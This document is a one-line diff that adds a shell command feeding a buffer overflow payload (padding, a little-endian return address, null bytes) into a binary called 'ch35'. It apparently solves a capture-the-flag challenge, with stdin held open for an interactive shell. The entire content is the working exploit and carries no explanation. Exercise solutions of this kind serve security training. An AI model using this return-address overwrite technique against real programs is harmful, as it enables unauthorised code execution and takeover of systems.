@@ -1,0 +1,1 @@
+cat <(python -c 'print "A"*280+"\xe7\x05\x40"+"\x00"*5') - | ./ch35
